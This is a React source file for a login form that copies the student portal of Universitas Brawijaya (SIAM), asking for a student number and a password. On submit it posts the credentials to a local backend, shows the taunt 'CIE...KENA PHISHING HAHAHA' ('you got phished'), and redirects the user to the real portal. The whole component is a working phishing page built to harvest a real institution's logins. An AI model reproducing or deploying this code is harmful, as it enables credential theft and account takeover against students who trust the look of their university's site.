import axios from "axios";
import React, { useEffect, useState } from "react";
import { Navigate, useNavigate } from "react-router-dom";

const FormLogin = () => {
  const [nim, setNim] = useState("");
  const [password, setPassword] = useState("");
  const [failed, setFailed] = useState(false);
  const [error, setError] = useState("");
  const navigate = useNavigate();

  const onSubmit = async (e) => {
    e.preventDefault();

    try {
      const response = await axios.post(
        "http://localhost:5050/siam",
        JSON.stringify({ nim, password })
      );
      setFailed(true);
      setError("CIE...KENA PHISHING HAHAHA");
      navigate("https://siam.ub.ac.id/");
      console.log(response);
    } catch (err) {
      console.log(err.response.data.data);
      setError(err.response.data.data["login-error"]);
      setFailed(true);
    }
  };

  return (
    <>
      <form onSubmit={onSubmit} action="">
        <div className="flex flex-col ">
          <div className="flex md:gap-1 md:flex-row flex-col justify-start gap-2">
            <input
              id="nim"
              name="nim"
              type="text"
              value={nim}
              placeholder="nim"
              required
              autoComplete="off"
              onChange={(event) => {
                setNim(event.target.value);
              }}
              className={`border-grey border-[1px] bg-white md:w-[135px] md:text-start ... md:h-full h-11 ... text-center px-2 py-1 md:text-[13px] text-[15px]  w-full`}
            />

            <input
              id="password"
              name="password"
              type="password"
              value={password}
              required
              placeholder="kata sandi"
              autoComplete="off"
              onChange={(event) => {
                setPassword(event.target.value);
              }}
              className={`border-grey border-[1px] bg-white md:w-[135px] md:text-start ... md:h-full h-11 ... text-center w-full px-2 py-1 md:text-[13px] text-[15px]`}
            />

            <button
              className={`bg-dark-blue text-white px-2 py-1 md:text-[13px] text-[15px]  ... md:h-full h-11 ... `}
            >
              Masuk
            </button>
          </div>
          <div className="flex justify-end items-end">
            {failed ? (
              <div
                className={`text-red-error-text text-[11px] mt-3 ${
                  error.length > 150
                    ? `max-w-[280px]  flex items-end justify-end text-right`
                    : `max-tablet:justify-end max-tablet:flex `
                }`}
              >
                {error}
              </div>
            ) : (
              <div></div>
            )}
          </div>
        </div>
      </form>
    </>
  );
};

export default FormLogin;
